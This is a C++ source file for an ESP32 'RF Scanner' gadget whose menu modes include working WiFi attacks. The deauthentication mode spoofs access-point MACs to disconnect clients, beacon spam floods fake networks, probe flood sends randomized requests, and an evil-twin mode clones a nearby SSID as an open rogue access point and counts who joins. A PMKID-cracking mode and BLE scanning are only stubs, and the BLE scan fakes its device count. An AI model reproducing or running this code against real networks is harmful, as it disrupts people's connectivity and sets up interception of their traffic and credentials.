#include "RFScanner.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"

RFScanner::RFScanner(DisplayManager* display)
    : display(display), sniffer(nullptr), currentMode(ScanMode::PASSIVE_SCAN),
      menuPosition(0), inSubmenu(false), startTime(0), totalPackets(0),
      totalDevices(0), targetChannel(1) {
    memset(targetMAC, 0, sizeof(targetMAC));
}

RFScanner::~RFScanner() {
    stop();
}

bool RFScanner::begin() {
    Serial.println("[RFScanner] Initializing RF Scanner Engine...");

    startTime = millis();
    totalPackets = 0;
    totalDevices = 0;
    currentMode = ScanMode::PASSIVE_SCAN;
    menuPosition = 0;
    inSubmenu = false;

    // Initialize packet sniffer
    sniffer = new PacketSniffer();

    if (display != nullptr) {
        display->clear();
        display->showMessage("RF Scanner", "Initializing...");
        delay(1000);
    }

    Serial.println("[RFScanner] RF Scanner initialized successfully");
    showMainMenu();

    return true;
}

void RFScanner::loop() {
    if (!inSubmenu) {
        // Just show menu, wait for button input
        delay(10);
        return;
    }

    // Run the selected mode
    switch (currentMode) {
        case ScanMode::PASSIVE_SCAN:
            runPassiveScan();
            break;

        case ScanMode::DEAUTH_ATTACK:
            runDeauthAttack();
            break;

        case ScanMode::BEACON_SPAM:
            runBeaconSpam();
            break;

        case ScanMode::PROBE_FLOOD:
            runProbeFlood();
            break;

        case ScanMode::EVIL_TWIN:
            runEvilTwin();
            break;

        case ScanMode::PMKID_CAPTURE:
            runPMKIDCapture();
            break;

        case ScanMode::BLE_SCAN:
            runBLEScan();
            break;
    }

    updateDisplay();
}

void RFScanner::stop() {
    Serial.println("[RFScanner] Stopping RF Scanner...");

    if (sniffer != nullptr) {
        sniffer->stop();
        delete sniffer;
        sniffer = nullptr;
    }

    if (display != nullptr) {
        display->clear();
        display->showMessage("RF Scanner", "Stopped");
    }
}

void RFScanner::handleButton(uint8_t button) {
    if (!inSubmenu) {
        // Handle menu navigation
        switch (button) {
            case 1: // Up
                if (menuPosition > 0) {
                    menuPosition--;
                    showMainMenu();
                }
                break;

            case 2: // Down
                if (menuPosition < 6) { // 7 modes (0-6)
                    menuPosition++;
                    showMainMenu();
                }
                break;

            case 0: // Select
                handleModeSelection();
                break;
        }
    } else {
        // In submenu, back button returns to menu
        if (button == 3) {
            inSubmenu = false;
            if (sniffer != nullptr) {
                sniffer->stop();
            }
            showMainMenu();
        }
    }
}

void RFScanner::showMainMenu() {
    if (display == nullptr) return;

    display->clear();
    display->showRFScannerMenu(menuPosition);
}

void RFScanner::handleModeSelection() {
    currentMode = (ScanMode)menuPosition;
    inSubmenu = true;

    Serial.print("[RFScanner] Mode selected: ");
    Serial.println(menuPosition);

    // Start the selected mode
    switch (currentMode) {
        case ScanMode::PASSIVE_SCAN:
            Serial.println("[RFScanner] Starting Passive Scan...");
            if (sniffer != nullptr) {
                sniffer->begin();
            }
            break;

        default:
            Serial.println("[RFScanner] Mode not yet implemented");
            break;
    }

    updateDisplay();
}

void RFScanner::runPassiveScan() {
    // Placeholder: Passive WiFi scanning
    if (sniffer != nullptr) {
        totalPackets = sniffer->getTotalPackets();
        totalDevices = sniffer->getDevices().size();
    }
    delay(100);
}

void RFScanner::runDeauthAttack() {
    // Deauthentication attack: Sends deauth frames to disconnect clients from APs
    if (sniffer == nullptr) return;

    // Get list of detected devices
    auto& devices = sniffer->getDevices();
    if (devices.empty()) {
        Serial.println("[RFScanner] No devices found. Run passive scan first.");
        delay(1000);
        return;
    }

    // Build deauth frame (802.11 management frame)
    uint8_t deauth_frame[26] = {
        0xC0, 0x00,  // Frame Control: Deauth
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP MAC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC
        0x00, 0x00,  // Sequence number
        0x07, 0x00   // Reason code: Class 3 frame from non-associated STA
    };

    // Send deauth frames to each AP
    for (auto& device_pair : devices) {
        DeviceStats& device = device_pair.second;
        if (device.is_ap) {
            memcpy(&deauth_frame[10], device.mac, 6);  // Source
            memcpy(&deauth_frame[16], device.mac, 6);  // BSSID

            for (int i = 0; i < 5; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
                delay(1);
            }
            Serial.print("[RFScanner] Deauth sent to: ");
            Serial.println(device.ssid);
        }
    }
    totalPackets += devices.size() * 5;
    delay(100);
}

void RFScanner::runBeaconSpam() {
    // Beacon spam: Creates fake APs to clutter WiFi scanners
    static uint16_t seq_num = 0;
    static int spam_count = 0;

    // Base beacon frame
    uint8_t beacon_frame[] = {
        0x80, 0x00,  // Frame Control: Beacon
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0x00,  // Source (will be randomized)
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0x00,  // BSSID
        0x00, 0x00,  // Sequence number
        // Beacon frame body
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
        0x64, 0x00,  // Beacon interval
        0x11, 0x04,  // Capability info
        // SSID IE
        0x00, 0x10,  // SSID parameter set (tag 0, length will vary)
        'F', 'a', 'k', 'e', 'A', 'P', '-', '0', '0', '0', '0', '0', '0', '0', '0', '0'
    };

    // Generate random APs
    for (int i = 0; i < 10; i++) {
        // Randomize MAC address
        beacon_frame[10] = random(256);
        beacon_frame[11] = random(256);
        beacon_frame[12] = random(256);
        beacon_frame[16] = beacon_frame[10];
        beacon_frame[17] = beacon_frame[11];
        beacon_frame[18] = beacon_frame[12];

        // Update sequence number
        beacon_frame[22] = (seq_num & 0xFF);
        beacon_frame[23] = (seq_num >> 8) & 0xFF;
        seq_num++;

        // Randomize SSID suffix
        sprintf((char*)&beacon_frame[38], "%04d", spam_count + i);

        esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
        delayMicroseconds(500);
    }

    spam_count += 10;
    totalPackets += 10;
    Serial.printf("[RFScanner] Beacon spam: %d fake APs sent\n", spam_count);
    delay(50);
}

void RFScanner::runProbeFlood() {
    // Probe flood: Sends probe requests to scan for networks rapidly
    static uint16_t seq_num = 0;

    uint8_t probe_frame[] = {
        0x40, 0x00,  // Frame Control: Probe Request
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // Source (randomized)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID: broadcast
        0x00, 0x00,  // Sequence number
        // Probe request body
        0x00, 0x00,  // SSID parameter set (broadcast)
        0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24  // Supported rates
    };

    // Send burst of probe requests
    for (int i = 0; i < 20; i++) {
        // Randomize source MAC
        probe_frame[10] = random(256);
        probe_frame[11] = random(256);
        probe_frame[12] = random(256);

        // Update sequence number
        probe_frame[22] = (seq_num & 0xFF);
        probe_frame[23] = (seq_num >> 8) & 0xFF;
        seq_num++;

        esp_wifi_80211_tx(WIFI_IF_STA, probe_frame, sizeof(probe_frame), false);
        delayMicroseconds(100);
    }

    totalPackets += 20;
    Serial.println("[RFScanner] Probe flood: 20 probe requests sent");
    delay(50);
}

void RFScanner::runEvilTwin() {
    // Evil Twin: Creates a rogue AP mimicking a legitimate one
    static bool ap_started = false;

    if (!ap_started) {
        // Get target AP from detected networks
        if (sniffer != nullptr) {
            auto& devices = sniffer->getDevices();
            if (!devices.empty()) {
                // Find first AP
                for (auto& device_pair : devices) {
                    if (device_pair.second.is_ap && !device_pair.second.ssid.isEmpty()) {
                        targetSSID = device_pair.second.ssid;
                        memcpy(targetMAC, device_pair.second.mac, 6);
                        break;
                    }
                }
            }
        }

        if (targetSSID.isEmpty()) {
            targetSSID = "FreeWiFi";  // Default if no targets found
        }

        Serial.printf("[RFScanner] Starting Evil Twin AP: %s\n", targetSSID.c_str());

        // Start AP with cloned SSID
        WiFi.mode(WIFI_AP);
        WiFi.softAP(targetSSID.c_str(), "");  // Open network
        ap_started = true;

        Serial.printf("[RFScanner] Evil Twin active on: %s\n", WiFi.softAPIP().toString().c_str());
    }

    // Monitor connected clients
    wifi_sta_list_t clients;
    esp_wifi_ap_get_sta_list(&clients);

    Serial.printf("[RFScanner] Evil Twin: %d clients connected\n", clients.num);
    totalDevices = clients.num;

    delay(1000);
}

void RFScanner::runPMKIDCapture() {
    // PMKID capture: Attempts to capture PMKID from WPA2 APs for offline cracking
    // PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)

    if (sniffer == nullptr) return;

    static bool capturing = false;
    static unsigned long last_attempt = 0;

    if (!capturing) {
        Serial.println("[RFScanner] Starting PMKID capture mode...");
        Serial.println("[RFScanner] Listening for EAPOL frames with PMKID...");

        // Set WiFi to STA mode and start scanning
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();

        capturing = true;
        last_attempt = millis();
    }

    // In real implementation, would parse EAPOL frames for PMKID
    // PMKID appears in the first EAPOL frame (Message 1 of 4-way handshake)
    // Located in RSN IE (Robust Security Network Information Element)

    // For now, just scan and report WPA2 networks
    if (millis() - last_attempt > 5000) {
        int n = WiFi.scanNetworks();
        Serial.printf("[RFScanner] Found %d networks\n", n);

        for (int i = 0; i < n; i++) {
            if (WiFi.encryptionType(i) == WIFI_AUTH_WPA2_PSK) {
                Serial.printf("[RFScanner] WPA2 Network: %s (RSSI: %d)\n",
                             WiFi.SSID(i).c_str(), WiFi.RSSI(i));
            }
        }

        last_attempt = millis();
        totalDevices = n;
    }

    delay(100);
}

void RFScanner::runBLEScan() {
    // BLE scanning: Scans for Bluetooth Low Energy devices
    // Note: Full BLE implementation requires BLEDevice library

    static bool ble_initialized = false;
    static unsigned long last_scan = 0;

    if (!ble_initialized) {
        Serial.println("[RFScanner] Initializing BLE scanner...");
        // Note: BLE and WiFi share radio, may cause conflicts
        // In production, would use: BLEDevice::init("ESP32-BLE-Scanner");
        Serial.println("[RFScanner] BLE scanning requires WiFi disable");
        Serial.println("[RFScanner] Feature partially implemented - WiFi/BLE conflict");
        ble_initialized = true;
    }

    // Simplified BLE scan simulation (real implementation needs BLEDevice)
    if (millis() - last_scan > 3000) {
        Serial.println("[RFScanner] BLE scan cycle...");
        // Would scan and report: device name, MAC, RSSI, services
        totalDevices++;
        last_scan = millis();
    }

    delay(100);
}

void RFScanner::updateDisplay() {
    if (display == nullptr) return;

    // Show current mode status
    unsigned long runtime = (millis() - startTime) / 1000;

    switch (currentMode) {
        case ScanMode::PASSIVE_SCAN:
            display->showRFScanStats(totalPackets, totalDevices, targetChannel, runtime);
            break;

        default:
            display->showMessage("RF Scanner", "Mode active...");
            break;
    }
}
